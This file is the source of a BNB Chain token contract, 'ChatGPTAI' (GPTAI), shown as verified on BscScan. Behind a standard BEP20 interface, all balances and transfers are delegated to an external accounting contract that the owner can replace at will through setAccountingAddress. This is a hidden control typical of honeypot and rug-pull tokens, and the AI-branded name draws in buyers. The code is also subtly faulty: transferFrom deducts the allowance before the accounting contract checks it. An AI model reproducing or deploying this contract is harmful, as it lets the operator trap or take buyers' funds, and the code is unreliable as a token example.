/**
 *Submitted for verification at BscScan.com on 2023-04-18
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.18;

// SafeMath library
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

// Interfaces

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Accounting {
    function doUpdates(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

// ChatGPTAI contract
contract ChatGPTAI is BEP20 {
    using SafeMath for uint256;

    address public owner = msg.sender;    
    string public name = "ChatGPTAI";
    string public symbol = "GPTAI";
    uint8 public _decimals;
    uint public _totalSupply;
    
    mapping (address => mapping (address => uint256)) private allowed;
    address private accounting;
    
    constructor() public {
        _decimals = 9;
        _totalSupply = 1000000 * 10 ** 9;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function _doUpdates(address from, address to, uint amount) internal {
        emit Transfer(from, to, amount);
        ChatGPTAIAccounting(accounting)._doUpdates(from, to, amount);
    }

    function _mint(address to, uint256 amount) internal {
        _totalSupply = _totalSupply.add(amount);
        emit Transfer(address(0), to, amount);
        ChatGPTAIAccounting(accounting)._mint(to, amount);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function initializeAccounting() public {
        require(msg.sender == owner, "Only the owner can call this function.");
        ChatGPTAIAccounting(accounting).initializeTotalSupply();
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view public returns (uint256) {
        return Accounting(accounting).balanceOf(who);
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == owner);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return Accounting(accounting).doUpdates(msg.sender, msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        require(amount > 1);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return Accounting(accounting).doUpdates(msg.sender, from, to, amount);
    }
        
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}

// ChatGPTAIAccounting contract
contract ChatGPTAIAccounting is Accounting {
    using SafeMath for uint256;

    mapping (address => uint256) private balances;
    ChatGPTAI private chatGptAi;

    constructor(address chatGptAiAddress) public {
        chatGptAi = ChatGPTAI(chatGptAiAddress);
    }

    function _doUpdates(address from, address to, uint amount) external {
        require(msg.sender == address(chatGptAi), "Only ChatGPTAI contract can call this function.");
        balances[from] = balances[from].sub(amount);
        balances[to] = balances[to].add(amount);
    }

    function _mint(address to, uint256 amount) external {
        require(msg.sender == address(chatGptAi), "Only ChatGPTAI contract can call this function.");
        balances[to] = balances[to].add(amount);
    }

    function doUpdates(address caller, address from, address to, uint amount) external override returns (bool) {
        require(msg.sender == address(chatGptAi), "Only ChatGPTAI contract can call this function.");

        // Check if the caller is allowed to transfer on behalf of 'from' address.
        if (caller != from) {
            require(chatGptAi.allowance(from, caller) >= amount, "Not enough allowance.");
        }

        // Subtract the amount from the sender's balance.
        balances[from] = balances[from].sub(amount);

        // Add the amount to the recipient's balance.
        balances[to] = balances[to].add(amount);

        return true;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return balances[who];
    }

    // Initialization function to set the initial total supply to the ChatGPTAI owner.
    function initializeTotalSupply() external {
        require(msg.sender == address(chatGptAi), "Only ChatGPTAI contract can call this function.");
        address ChatGPTAIOwner = chatGptAi.getOwner();
        uint256 initialSupply = chatGptAi.totalSupply();
        balances[ChatGPTAIOwner] = initialSupply;
    }
}